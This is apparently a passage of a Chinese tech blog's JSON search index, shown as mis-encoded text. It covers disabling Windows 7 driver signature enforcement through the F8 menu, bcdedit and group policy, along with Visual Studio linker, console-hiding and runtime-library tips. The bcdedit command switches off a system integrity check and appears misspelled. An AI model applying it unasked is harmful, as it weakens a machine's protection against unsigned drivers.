å…·ä½“æ–¹æ³•å¦‚ä¸‹: 1ã€åœ¨ win7 64 ä½ç³»ç»Ÿä¸Šï¼Œå®‰è£…æŸäº›é©±åŠ¨ç¨‹åºæ— æ³•æˆåŠŸæ—¶ï¼Œè€ƒè™‘ç¦ç”¨æ•°å­—ç­¾åï¼Œé‡æ–°å¯åŠ¨è®¡ç®—æœºï¼›è¿™æ˜¯ä¸ XP ç³»ç»Ÿä¸åŒçš„åœ°æ–¹ï¼ŒXP ç³»ç»Ÿæ²¡æœ‰è¿™ä¸ªåŠŸèƒ½ï¼Œä¸ç”¨è€ƒè™‘ç¦ç”¨æ•°å­—ç­¾åï¼› 2ã€åœ¨ç”µè„‘å¯åŠ¨çš„è¿‡ç¨‹ä¸­ï¼Œä¸ç”¨ç­‰åˆ°è¿›å»è¾“å…¥ç”¨æˆ·ç™»é™†æ¡†ï¼ŒæŒ‰é”®ç›˜ä¸Šé¢çš„æŒ‰é”® F8ï¼Œå°±ä¼šå‡ºç°ç³»ç»Ÿå¯åŠ¨é¡¹ï¼Œä¾›æˆ‘ä»¬è¿›è¡Œé€‰æ‹©ï¼› 3ã€ç„¶åé€‰æ‹©ï¼Œç¦ç”¨æ•°å­—ç­¾åï¼Œå¯åŠ¨ç”µè„‘ï¼Œæ•°å­—ç­¾åè¢«ç¦ç”¨åï¼Œé©±åŠ¨å°±èƒ½æˆåŠŸå®‰è£…äº†ã€‚ä½†æ˜¯é‡å¯ç”µè„‘ä¹‹åï¼Œè®¾ç½®åˆä¼šæ¢å¤æˆå¯ç”¨æ•°å­—ç­¾åã€‚æœ‰äº›ç”µè„‘çš„ç¦ç”¨ï¼Œæ˜¯ä¸€æ¬¡æ€§çš„ï¼› 4ã€æˆ‘ä»¬ä¹Ÿå¯ä»¥å¼ºåˆ¶å…³é—­æ•°å­—ç­¾åï¼Œè¿›å…¥ç³»ç»Ÿåï¼Œä½¿ç”¨ç®¡ç†å‘˜ï¼Œåœ¨ CMD è¿è¡Œå™¨ä¸­ï¼Œè¾“å…¥ bcdedit.exe -set loadoptions DDISABLE_INTEGRITY_CHECKS ï¼›ç„¶åä¼šå‡ºç°ç¦ç”¨æˆåŠŸçš„æç¤ºï¼› 5ã€å†é‡å¯ç”µè„‘ï¼Œé‚£ä¹ˆç³»ç»Ÿå°±ä¼šä¸€ç›´é»˜è®¤å…³é—­æ•°å­—ç­¾åäº†ã€‚å®‰è£…é©±åŠ¨å°±ä¼šæˆåŠŸäº†ã€‚ ä»¥ä¸Šå†…å®¹å°±æ˜¯ win7 64 ä½ç³»ç»Ÿç¦ç”¨æ•°å­—ç­¾åçš„è¯¦ç»†æ­¥éª¤ï¼Œå…³é—­æ•°å­—ç­¾ååï¼Œåº”ç”¨ç¨‹åºå°±å¯ä»¥å®‰è£…æˆåŠŸäº†ã€‚ å¯èƒ½å­˜åœ¨çš„é—®é¢˜ win7 X64 ç³»ç»Ÿä¸­å¯¹é©±åŠ¨ç¨‹åºè¦æ±‚æœ‰æ•°å­—ç­¾åï¼Œå¦åˆ™æ— æ³•æ­£å¸¸ä½¿ç”¨ã€‚ä½†æœ‰æ—¶éœ€è¦ç”¨åˆ°æ²¡æœ‰æ•°å­—ç­¾åçš„é©±åŠ¨ç¨‹åºï¼Œå¯æ­£å¸¸å®‰è£…åé©±åŠ¨æ˜¯æ— æ³•ä½¿ç”¨çš„ï¼Œ å…·ä½“è¡¨ç°å¦‚ä¸‹ï¼š 1ã€æ— æ³•è‡ªåŠ¨è¯†åˆ«ç¡¬ç›˜æ§åˆ¶å™¨ ä½¿ç”¨éæ­£ç‰ˆçš„ä¸ªåˆ«æ“ä½œç³»ç»Ÿå…‰ç›˜ï¼Œåœ¨å®‰è£…ç³»ç»Ÿæ—¶ï¼Œå®¹æ˜“å‡ºç°æ­¤é”™è¯¯ã€‚åŸå› æ˜¯éæ­£ç‰ˆå…‰ç›˜è‡ªåŠ¨åŠ è½½çš„ç¡¬ç›˜æ§åˆ¶å™¨é©±åŠ¨ä¸ç¬¦åˆç”µè„‘è‡ªèº«éœ€è¦çš„é©±åŠ¨ã€‚è¿™ç§æƒ…å†µå°±å»ºè®®æ¢æ­£ç‰ˆå…‰ç›˜å®‰è£…æ“ä½œç³»ç»Ÿã€‚ 2ã€æ‰‹åŠ¨æ›´æ–°é”™è¯¯çš„é©±åŠ¨ç¨‹åº windowsæ“ä½œç³»ç»Ÿæ­£å¸¸ä½¿ç”¨ï¼Œä½†æ‰‹åŠ¨æ›´æ–°é©±åŠ¨ç¨‹åºæŠŠç¡¬ç›˜æ§åˆ¶å™¨çš„é©±åŠ¨ç¨‹åºæ›´æ–°é”™è¯¯ï¼Œå¯¼è‡´æ­¤æ•…éšœã€‚è§£å†³æ–¹æ³•æ˜¯è¿›å…¥windowsç³»ç»Ÿé«˜çº§èœå•ï¼Œé€‰æ‹©æœ€åä¸€æ¬¡çš„æ­£å¸¸é…ç½®ï¼Œå³å¯æ­£å¸¸è¿›å…¥ç³»ç»Ÿã€‚ 3ã€bios è®¾ç½®å˜åŒ–åæ‰€å¯¼è‡´ windows æ“ä½œç³»ç»Ÿæ­£å¸¸ï¼Œä½†æ˜¯ç”±äºæŸäº›åŸå› ï¼Œç”¨æˆ·ä¿®æ”¹äº† bios è®¾ç½®ï¼Œå¯¼è‡´ 0x0000007b æ•…éšœã€‚ â‘ å¦‚æœåªæ˜¯ä¸€æ¬¡æ€§ç¦ç”¨é©±åŠ¨ç¨‹åºçš„è®¤è¯ç­¾åï¼Œå¯ä»¥åœ¨å¼€æœºæ—¶æŒ‰ F8 é”®ï¼Œåœ¨å¼¹å‡ºçš„èœå•ä¸­æœ‰ ç¦ç”¨é©±åŠ¨ç¨‹åºç­¾åå¼ºåˆ¶ é€‰é¡¹ï¼Œä½¿ç”¨ä¸Šä¸‹é”®é€‰ä¸­ä¹‹åï¼Œå†æŒ‰å›è½¦é”®ç¡®è®¤ï¼Œè¿›å…¥ç³»ç»Ÿå³å¯ä½¿ç”¨è‡ªå·±çš„é©±åŠ¨ç¨‹åºæ›´æ–°è®¾å¤‡çš„é©±åŠ¨ç¨‹åºäº†ã€‚ â‘¡å°¤å…¶æ˜¯ä¸éœ€è¦å¾®è½¯çš„ç­¾åé©±åŠ¨ç¨‹åºï¼Œè¿˜å¯ä»¥è¿™æ ·æ‰“å¼€ç³»ç»Ÿå±æ€§è¿›è¡Œè®¾ç½®ï¼š è¿è¡Œä¸­è¾“å…¥ï¼šsysdm.cpl â†’ ç¡®å®š â‘¢ç¡¬ä»¶â†’è®¾å¤‡å®‰è£…è®¾ç½® â‘£ä»ä¸å®‰è£…æ¥è‡ª Windows Update çš„é©±åŠ¨ç¨‹åºè½¯ä»¶â†’ä¿å­˜æ›´æ”¹ å»ºè®®ï¼šä½¿ç”¨å®Œæ¯•ï¼Œå†æ”¹å›ä½¿ç”¨ Windows Update æ›´æ–°é©±åŠ¨é€‰é¡¹ï¼Œæ¯•ç«Ÿå¾ˆå¤šè®¾å¤‡éƒ½éœ€è¦ä½¿ç”¨å¾®è½¯è®¤è¯ç­¾åçš„é©±åŠ¨ç¨‹åºã€‚ â‘¤è¿˜å¯ä»¥ä½¿ç”¨å‘½ä»¤ï¼š å¼€å§‹â†’æ‰€æœ‰ç¨‹åºâ†’é™„ä»¶â†’å³é”®å‘½ä»¤æç¤ºç¬¦â†’ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œ â‘¥æ‰“å¼€å‘½ä»¤æç¤ºç¬¦ï¼Œå¤åˆ¶ä»¥ä¸‹çš„å‘½ä»¤ï¼Œå³é”®ç‚¹å‡»ç©ºç™½å¤„â†’ç²˜è´´â†’åœ¨æŒ‰å›è½¦é”®ï¼š bcdedit.exe -set loadoptions DDISABLE_INTEGRITY_CHECKS å‘½ä»¤æ­£ç¡®ï¼Œæœ‰æ“ä½œæˆåŠŸå®Œæˆçš„æç¤ºã€‚ â‘¦é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜å¯ä»¥åœ¨ç»„ç­–ç•¥ä¸­è¿›è¡Œç›¸å…³è®¾ç½®ï¼š å¼€å§‹â†’è¿è¡Œâ†’è¾“å…¥ï¼š gpedit.msc å›è½¦æ‰“å¼€ç»„ç­–ç•¥ç¼–è¾‘å™¨ã€‚ â‘§åœ¨çª—ä½“å·¦ä¾§é€‰æ‹©ï¼š ç”¨æˆ·é…ç½®â†’ç®¡ç†æ¨¡æ¿â†’ç³»ç»Ÿâ†’é©±åŠ¨ç¨‹åºå®‰è£…â†’å†åŒå‡»å³ä¾§çª—å£çš„ è®¾å¤‡é©±åŠ¨çš„ä»£ç ç­¾å ç­–ç•¥è¿›è¡Œè®¾ç½®ã€‚ â‘¨ç‚¹é€‰â†’å·²å¯ç”¨â†’è¿™é‡Œè¿˜æœ‰ä¸‰ä¸ªé€‰æ‹©é¡¹ï¼šè­¦å‘Šã€å¿½ç•¥ã€ç»„ç»‡(é»˜è®¤æ˜¯è­¦å‘Š)â†’ç¡®å®š","tags":[{"name":"Windows/Win7","slug":"Windows-Win7","permalink":"https://hodlyounger.github.io/tags/Windows-Win7/"},{"name":"Windows/ç­¾å","slug":"Windows-ç­¾å","permalink":"https://hodlyounger.github.io/tags/Windows-%E7%AD%BE%E5%90%8D/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"é©±åŠ¨","slug":"A-OS/Windows/é©±åŠ¨","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E9%A9%B1%E5%8A%A8/"}]},{"title":"ã€Visual Studioã€‘C++ å¸¸è§é”™è¯¯â€”â€”æ— æ³•è§£æçš„å¤–éƒ¨ç¬¦å·","date":"2023-10-27T01:24:01.969Z","path":"A_OS/Windows/Visual Studio/æ— æ³•è§£æçš„å¤–éƒ¨ç¬¦å·é”™è¯¯å¤„ç†/","text":"å…³äºC++å¸¸è§é”™è¯¯â€œæ— æ³•è§£æçš„å¤–éƒ¨ç¬¦å·â€è¿™ä¸€é—®é¢˜å¦‚ä½•è§£å†³çš„æ€è€ƒä¸æ–¹æ³•ã€‚ æœ¬æ–‡å°±ä½¿ç”¨libeventä¸­é‡åˆ°çš„ç›¸ä¼¼é—®é¢˜ç€æ‰‹è¿›è¡Œåˆ†æè¯¥å¦‚ä½•è§£å†³ï¼Œå…¶ä»–æƒ…å†µä»éœ€æŒ‰å®é™…æƒ…å†µè¿›è¡Œåˆ†æå¤„ç†ã€‚å¸¸è§çš„åŸå› æ— å¤–ä¹ç¼ºå°‘ç¼–è¯‘åº“ã€‚ å¦‚ä¸Šå›¾æ‰€ç¤ºï¼ŒæŠ¥é”™ä¸ºæ— æ³•è§£æçš„å¤–éƒ¨ç¬¦å·ï¼Œç¬¦å·ä¸º __imp__if_nametoindex@4ï¼Œ ä¸€èˆ¬è¿™ç§ç¬¦å·å°±æ˜¯ç¼ºå°‘å¯¼å‡ºçš„æ¥å£ï¼Œå¯¼å‡ºæ¥å£ä¸€èˆ¬ä¸º å‡½æ•°å@å¯¼å‡ºåºå·ã€‚åŸºæœ¬å¯ä»¥ç¡®å®šæ˜¯ç¼ºå°‘ä¸€ä¸ªé“¾æ¥åº“ã€‚å…¶æ¬¡ å‡ºç°å­—ç¬¦_impï¼Œè¯´æ˜ä¸æ˜¯çœŸæ­£çš„é™æ€åº“ï¼Œè€Œæ˜¯æŸä¸ªåŠ¨æ€åº“çš„å¯¼å…¥åº“ï¼Œå¯¼å…¥å‡½æ•°å’Œè‡ªå·±ä¸åŒåï¼Œæ‰€ä»¥åŠ äº†å­—ç¬¦_impã€‚è¿™é‡Œå¯ä»¥ç¡®å®šå¯¼å‡ºå‡½æ•°åä¸º if_nametoindexï¼› ç¡®å®šäº†å¯¼å‡ºå‡½æ•°åä¸º if_nametoindex ä¹‹åï¼Œå¯ä»¥ç™¾åº¦æŸ¥çœ‹ä¸€ä¸‹æœ‰æ²¡æœ‰ç›¸å…³å‡½æ•°çš„ä¿¡æ¯ï¼› ä¸€æœå‘ç°ä¸ºwindowsç³»ç»Ÿå‡½æ•°ï¼Œæ˜¯ç½‘ç»œç›¸å…³çš„æ¥å£å‡½æ•°ï¼Œè´Ÿè´£å°†ANSIæ¥å£è½¬æ¢ä¸ºæ¥å£çš„æœ¬åœ°ç´¢å¼•ã€‚å…¶å£°æ˜éœ€è¦åŒ…å«çš„é™æ€åº“æ–‡ä»¶ä¸º Netio.libã€‚ä½†æ˜¯ç¬”è€…è¿™è¾¹æµ‹è¯•ä¹‹åå‘ç°æ— æ³•æ‰“å¼€ Netio.lib è¿™ä¸ªé™æ€åº“ï¼Œå†æŸ¥æ‰¾ï¼Œæ‰¾åˆ°å…¶ç›¸å…³ç´¢å¼•ä¸º IP Helper Functionsã€‚ è‡³æ­¤ï¼ŒåŸºæœ¬ä¸Šå¯ä»¥ç¡®å®šå…¶ç¼ºå°‘çš„é™æ€åº“å’Œç½‘ç»œéƒ¨åˆ†ç›¸å…³ï¼Œæ‰¾åˆ°ç›¸å…³å‡½æ•°ï¼ˆè¿™é‡ŒæŸ¥çœ‹çš„å‡½æ•°ä¸º AddIPAddressï¼‰ï¼ŒæŸ¥çœ‹å…¶å‡½æ•°ä½¿ç”¨è¦æ±‚ï¼Œéœ€è¦å¼•ç”¨ Iphlpapi.libï¼Œå¼•å…¥åˆ°ä»£ç ä¸­ï¼Œç¼–è¯‘æˆåŠŸã€‚","tags":[{"name":"æ•´ç†","slug":"æ•´ç†","permalink":"https://hodlyounger.github.io/tags/%E6%95%B4%E7%90%86/"},{"name":"æ€è€ƒ","slug":"æ€è€ƒ","permalink":"https://hodlyounger.github.io/tags/%E6%80%9D%E8%80%83/"},{"name":"é”™è¯¯","slug":"é”™è¯¯","permalink":"https://hodlyounger.github.io/tags/%E9%94%99%E8%AF%AF/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"Visual Studio","slug":"A-OS/Windows/Visual-Studio","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/Visual-Studio/"}]},{"title":"ã€Visual Studioã€‘å¦‚ä½•è®©æ§åˆ¶å°ç¨‹åºä¸æ˜¾ç¤ºç•Œé¢","date":"2023-10-27T01:24:01.967Z","path":"A_OS/Windows/Visual Studio/ã€Visual Studioã€‘æ§åˆ¶å°ç¨‹åºä¸æ˜¾ç¤ºç•Œé¢/","text":"æ¦‚è¿°ï¼šç¨‹åºæ§åˆ¶å°ç¨‹åºå¦‚ä½•ä¸æ˜¾ç¤ºç•Œé¢ [toc] windowsæ§åˆ¶å°ç¨‹åºä¸æ˜¾ç¤ºç•Œé¢çš„å‡ ç§æ–¹å¼ è¦ä½¿Windowsæ§åˆ¶å°ç¨‹åºåœ¨åå°è¿è¡Œï¼Œè€Œä¸æ˜¾ç¤ºç•Œé¢ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‡ ç§æ–¹æ³•ï¼š 1. æ›´æ”¹ç¨‹åºçš„åç¼€å å°†ç¨‹åºçš„åç¼€åä¿®æ”¹ä¸º.comæˆ–è€….pifï¼Œè¿™ä¼šå¯¼è‡´ç¨‹åºåœ¨åå°è¿è¡Œæ—¶ä¸æ˜¾ç¤ºæ§åˆ¶å°çª—å£ã€‚ 2. ä¿®æ”¹ç¨‹åºçš„å­ç³»ç»Ÿ ä½¿ç”¨Visual Studioç­‰å¼€å‘å·¥å…·ï¼Œå°†ç¨‹åºçš„å­ç³»ç»Ÿä¿®æ”¹ä¸ºWindowsè€Œä¸æ˜¯Consoleã€‚è¿™æ ·å¯ä»¥ä½¿ç¨‹åºåœ¨åå°ä»¥çª—å£åº”ç”¨ç¨‹åºçš„å½¢å¼è¿è¡Œã€‚å…·ä½“æ­¥éª¤å¦‚ä¸‹ï¼š æ‰“å¼€é¡¹ç›®çš„å±æ€§ï¼ˆå³é”®é¡¹ç›® -&gt; å±æ€§ï¼‰ã€‚ åˆ‡æ¢åˆ°â€œé…ç½®å±æ€§â€ -&gt; â€œé“¾æ¥å™¨â€ -&gt; â€œç³»ç»Ÿâ€ã€‚ ä¿®æ”¹â€œå­ç³»ç»Ÿâ€å±æ€§ä¸ºâ€œWindows (/SUBSYSTEM:WINDOWS)â€ã€‚ ç¼–è¯‘å’Œè¿è¡Œé¡¹ç›®ã€‚ ä½¿ç”¨æ­¤æ–¹å¼å¯èƒ½ä¼šä½¿ç¨‹åºç¼–è¯‘æŠ¥é”™ï¼š 12é”™è¯¯ LNK2001 æ— æ³•è§£æçš„å¤–éƒ¨ç¬¦å· _WinMain@16fatal error LNK1120: 1 ä¸ªæ— æ³•è§£æçš„å¤–éƒ¨å‘½ä»¤ éœ€è¦åœ¨æ–‡ä»¶ä¸­æ·»åŠ ä»¥ä¸‹ä»£ç ï¼š 12// è®¾ç½®è¿æ¥å™¨é€‰é¡¹#pragma comment(linker, &quot;/entry:mainCRTStartup&quot;) ä½¿ç”¨ç¬¬ä¸‰æ–¹å·¥å…· å¯ä»¥ä½¿ç”¨ç¬¬ä¸‰æ–¹å·¥å…·å°†æ§åˆ¶å°ç¨‹åºåŒ…è£…æˆæ— ç•Œé¢çš„åº”ç”¨ç¨‹åºã€‚ä¾‹å¦‚ï¼Œå¯ä»¥ä½¿ç”¨nssmï¼ˆNon-Sucking Service Managerï¼‰å·¥å…·å°†æ§åˆ¶å°ç¨‹åºå®‰è£…ä¸ºæœåŠ¡ï¼Œå¹¶è®¾ç½®è¯¥æœåŠ¡åœ¨åå°è¿è¡Œè€Œä¸æ˜¾ç¤ºç•Œé¢ã€‚ ä»¥ä¸Šæ˜¯å‡ ç§å¸¸ç”¨çš„æ–¹æ³•ï¼Œå¯ä»¥æ ¹æ®å…·ä½“éœ€æ±‚é€‰æ‹©é€‚åˆçš„æ–¹å¼æ¥å®ç°æ§åˆ¶å°ç¨‹åºåœ¨åå°è¿è¡Œè€Œä¸æ˜¾ç¤ºç•Œé¢ã€‚","tags":[{"name":"windows/visual-studio","slug":"windows-visual-studio","permalink":"https://hodlyounger.github.io/tags/windows-visual-studio/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"Visual Studio","slug":"A-OS/Windows/Visual-Studio","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/Visual-Studio/"}]},{"title":"ã€Visual Studioã€‘å†…ç½®å¼•å…¥æ–‡ä»¶","date":"2023-10-27T01:24:01.967Z","path":"A_OS/Windows/Visual Studio/ã€Visual Studioã€‘æ–‡ä»¶å†…ç½®å¼•å…¥/","text":"æ¦‚è¿°ï¼šä»‹ç»äº†å¦‚ä½•ä½¿ç”¨ visual studio å¼•å…¥é»˜è®¤çš„åº“æ–‡ä»¶å’Œå¤´æ–‡ä»¶ åœ¨ç”¨æˆ·ç›®å½•ä¸‹æœ‰è¿™æ ·ä¸€ä¸ªæ–‡ä»¶ï¼Œè·¯å¾„ä¸º C:\\Users\\ç”¨æˆ·å\\AppData\\Local\\Microsoft\\MSBuild\\v4.0 Microsoft.Cpp.*.user.props è¯¥æ–‡ä»¶ç”¨äºå®šä¹‰ç”¨æˆ·è‡ªå·±éœ€è¦å®šä¹‰çš„ä¸€äº›é…ç½®ã€‚ æŸ¥çœ‹å†…å®¹å¦‚ä¸‹æ‰€ç¤ºï¼š 1234567891011121314&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;Project DefaultTargets=&quot;Build&quot; xmlns=&quot;http://schemas.microsoft.com/developer/msbuild/2003&quot;&gt; &lt;ImportGroup Label=&quot;PropertySheets&quot;&gt; &lt;/ImportGroup&gt; &lt;PropertyGroup Label=&quot;UserMacros&quot; /&gt; &lt;PropertyGroup&gt; &lt;IncludePath&gt;D:\\Documents\\A_Source\\CWPP\\360GPUBNew\\dev\\include;D:\\Documents\\A_Source\\CWPP\\360GPUBNew\\dev\\include;D:\\Documents\\A_Source\\CWPP\\360LPUB\\dev\\include;D:\\Documents\\A_Source\\CWPP\\360LPUB\\dev\\include\\360safe\\360NewExamine;D:\\Documents\\A_Source\\CWPP\\360LPUB\\dev\\include\\SiteUI;D:\\Documents\\A_Source\\CWPP\\360LPUB\\opensource\\VC-LTL4;$(ProjectDir);$(IncludePath) &lt;/IncludePath&gt; &lt;LibraryPath&gt;D:\\Documents\\A_Source\\CWPP\\360GPUBNew\\dev\\lib_s3;D:\\Documents\\A_Source\\CWPP\\360GPUBNew\\dev\\lib_s3\\vc2017;D:\\Documents\\A_Source\\CWPP\\360LPUB\\dev\\lib\\360netmon;$(LibraryPath)&lt;/LibraryPath&gt; &lt;/PropertyGroup&gt; &lt;ItemDefinitionGroup /&gt; &lt;ItemGroup /&gt;&lt;/Project&gt; å…¶ä¸­ï¼š IncludePathï¼šå³ä¸ºéœ€è¦åŒ…å«çš„å¤´æ–‡ä»¶ç›®å½• LibraryPathï¼šä¸ºéœ€è¦å¼•å…¥åº“æ–‡ä»¶çš„ç›®å½• å…¶ä»–ç¼–è¯‘ç‰ˆæœ¬åŒç†","tags":[{"name":"Windows/Visual-Studio","slug":"Windows-Visual-Studio","permalink":"https://hodlyounger.github.io/tags/Windows-Visual-Studio/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"Visual Studio","slug":"A-OS/Windows/Visual-Studio","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/Visual-Studio/"}]},{"title":"ã€Visual Studioã€‘MDä¸MTçš„åŒºåˆ«åŠè¿è¡Œåº“ç±»å‹é€‰æ‹©","date":"2023-10-27T01:24:01.957Z","path":"A_OS/Windows/Visual Studio/ã€Visual Studioã€‘MDä¸MTçš„åŒºåˆ«/","text":"æ¦‚è¿°ï¼šMD ä¸ MT æ ‡å¿—è¯´æ˜åŠè¿è¡Œåº“ç±»å‹é€‰æ‹© [toc] æœ¬ç¯‡ä¸»è¦æ€»ç»“ä¸€ä¸‹è‡ªå·±åœ¨é¡¹ç›®å¼€å‘è¿‡ç¨‹ä¸­ç»å¸¸é‡åˆ°çš„ä¸€ä¸ªé—®é¢˜ï¼Œå³Visual Studioç¼–è¯‘è¿‡ç¨‹ä¸­å¦‚ä½•é€‰æ‹©è¿è¡Œåº“çš„ç±»å‹ã€‚å¸Œæœ›å¯¹å…¶å®ƒå¼€å‘çš„ä¼™ä¼´ä»¬æœ‰ä¸€å®šçš„å‚è€ƒä»·å€¼å’Œå¸®åŠ©ã€‚ 1.åœ¨Visual Studioä¸­è®¾ç½® åœ¨Visual Studio 2019ä¸­ï¼Œå³é”®é¡¹ç›®åç§°ï¼Œæ‰“å¼€é¡¹ç›®å±æ€§é¡µï¼Œé€‰æ‹©â€œé…ç½®å±æ€§â€-&gt;â€œC/C++â€-&gt;â€œä»£ç ç”Ÿæˆâ€-&gt;â€œè¿è¡Œåº“â€å³å¯å¯¹è¿è¡Œåº“ç±»å‹è¿›è¡Œè®¾ç½®ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚ è¿™é‡Œè¿è¡Œåº“ç±»å‹ä¸»è¦åŒ…å«å››ç§ï¼šå¤šçº¿ç¨‹(/MT)ã€å¤šçº¿ç¨‹è°ƒè¯•(/MTd)ã€å¤šçº¿ç¨‹DLL(/MD)ã€å¤šçº¿ç¨‹è°ƒè¯•(/MDd)ã€‚å…¶ä¸­å¸¦æœ‰dçš„ç±»å‹æ˜¯é¡¹ç›®çš„è°ƒè¯•ç‰ˆæœ¬ï¼Œä¸å¸¦æœ‰dçš„ç±»å‹æ˜¯é¡¹ç›®çš„Releaseç‰ˆæœ¬ã€‚ 2. MTä¸MDçš„åŒºåˆ« **/MTï¼š**æ˜¯multithread-static versionï¼Œæ˜¯å¤šçº¿ç¨‹é™æ€ç‰ˆæœ¬çš„æ„æ€ï¼Œé¡¹ç›®ä¼šä½¿ç”¨è¿è¡Œæ—¶åº“çš„å¤šçº¿ç¨‹é™æ€ç‰ˆæœ¬ï¼Œç¼–è¯‘å™¨ä¼šå°†LIBCMT.libæ”¾å…¥.objæ–‡ä»¶ä¸­ï¼Œä»¥ä¾¿é“¾æ¥å™¨ä½¿ç”¨LIBCMT.libè§£æå¤–éƒ¨ç¬¦å·ï¼› **/MTdï¼š**æ˜¯å®šä¹‰äº†_DEBUGå’Œ/MTï¼Œæ˜¯/MTç±»å‹çš„debugç‰ˆæœ¬ï¼› **/MDï¼š**æ˜¯multithread-dll versionï¼Œæ˜¯å¤šçº¿ç¨‹dllç‰ˆæœ¬çš„æ„æ€ï¼Œé¡¹ç›®ä¼šä½¿ç”¨è¿è¡Œæ—¶åº“çš„å¤šçº¿ç¨‹åŠ¨æ€dllç‰ˆæœ¬ï¼Œç¼–è¯‘å™¨ä¼šå°†MSVCRT.libæ”¾å…¥.objæ–‡ä»¶ä¸­ï¼Œåœ¨ç¼–è¯‘é¡¹ç›®æ—¶ï¼Œå®ƒä¼šé™æ€é“¾æ¥MSVCRT.libï¼Œä½†åœ¨å®é™…è¿è¡Œè¿‡ç¨‹ä¸­ï¼Œå®ƒä¼šé“¾æ¥ä½¿ç”¨MSVCR90.dllï¼› **MDdï¼š**æ˜¯å®šä¹‰äº†_DEBUGå’Œ/MDï¼Œæ˜¯/MDç±»å‹çš„debugç‰ˆæœ¬ï¼› å› æ­¤ï¼Œæˆ‘ä»¬åœ¨ç¼–è¯‘æ—¶ï¼Œå¯¹åº”çš„åº“ä¸€å®šè¦é…å¥—ä¸€è‡´ã€‚æ¯”å¦‚ä½ ç”¨CMakeç”Ÿæˆå·¥ç¨‹æ–‡ä»¶æ—¶ï¼Œè‹¥CMakeæ˜¯ç”¨/MTç±»å‹ç”Ÿæˆçš„ï¼Œåˆ™å®ƒæ‰€è°ƒç”¨çš„è¿è¡Œæ—¶åº“ä¸ºLIBCMT.libï¼›åé¢ç”Ÿæˆå·¥ç¨‹æ—¶ï¼Œä½ å¿…é¡»ä¹Ÿé€‰æ‹©/MTç±»å‹ï¼Œå¦åˆ™ä½ é€‰æ‹©/MDç±»å‹çš„è¯ï¼Œå·¥ç¨‹åœ¨é“¾æ¥æ—¶ä¼šè°ƒç”¨MSVCRT.libå’ŒMSVCR90.dllï¼Œæ˜¾ç„¶ä¸¤æ¬¡è°ƒç”¨ä¸åŒçš„è¿è¡Œæ—¶åº“ï¼Œä¼šå‡ºç°é‡å®šä¹‰çš„é”™è¯¯ã€‚ æ€»èµ·æ¥è¯´ï¼Œ/MDç±»å‹è¡¨ç¤ºè¿è¡Œæ—¶åº“ä¸é›†æˆï¼Œç”Ÿæˆçš„æ–‡ä»¶å°ï¼Œç¨‹åºè¿è¡Œæ—¶åŠ¨æ€åŠ è½½å¯¹åº”çš„dllï¼›/MTç±»å‹è¡¨ç¤ºè¿è¡Œæ—¶åº“é›†æˆï¼Œç”Ÿæˆçš„æ–‡ä»¶è¾ƒå¤§ï¼Œåœ¨é“¾æ¥æ—¶å°†C/C++è¿è¡Œæ—¶åº“é›†æˆåˆ°ç¨‹åºä¸­ã€‚ 3. ä½¿ç”¨ åœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­ï¼Œå¦‚æœReleaseæ¨¡å¼ä¸‹ä½¿ç”¨MDç¼–è¯‘çš„æ–‡ä»¶æŠ¥é”™ç¼ºå°‘ MSVCD140ã€‚dllï¼Œåˆ™å¯ä»¥ä½¿ç”¨ MT é€‰é¡¹ç¼–è¯‘ï¼Œè§£å†³ç¼ºå°‘åŠ¨æ€åº“çš„é—®é¢˜ã€‚","tags":[{"name":"Windows/Visual-Studio","slug":"Windows-Visual-Studio","permalink":"https://hodlyounger.github.io/tags/Windows-Visual-Studio/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"Visual Studio","slug":"A-OS/Windows/Visual-Studio","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/Visual-Studio/"}]},{"title":"ã€Visual Studioã€‘é€šç”¨é…ç½®","date":"2023-10-27T01:24:01.956Z","path":"A_OS/Windows/Visual Studio/ã€Visual Studioã€‘é€šç”¨é…ç½®/","text":"å·¥å…·é›† 1$(DefaultPlatformToolset) SDK 1$([Microsoft.Build.Utilities.ToolLocationHelper]::GetLatestSDKTargetPlatformVersion(&#x27;Windows&#x27;, &#x27;10.0&#x27;)) Qt ç‰ˆæœ¬ éœ€è¦è®¾ç½®æ³¨å†Œè¡¨é¡¹ï¼Œå€¼ä¸ºQtå®‰è£…è·¯å¾„ 1$(QtPath) ç”Ÿæˆäº‹ä»¶ 1call $(SolutionDir)prompt.bat prompt.bat 123456789101112131415@echo offecho -----------------------------------------------------echo [TrustAgent.pro] æ–‡ä»¶æœ‰æ›´æ–°æ—¶ï¼Œè¯·é‡æ–°ç”Ÿæˆå½“å‰å·¥ç¨‹echo ä»¥ä¸‹é…ç½®å¹¶ä¸é€‚ç”¨äºæ‰€æœ‰äººï¼Œå¦‚æœ‰ç¼–è¯‘æŠ¥é”™ï¼Œè¯·è‡ªè¡Œä¿®æ”¹ã€‚echo 1. Qtå·¥å…·é›†é»˜è®¤é…ç½®ä¸ºç¯å¢ƒå˜é‡QtPath: 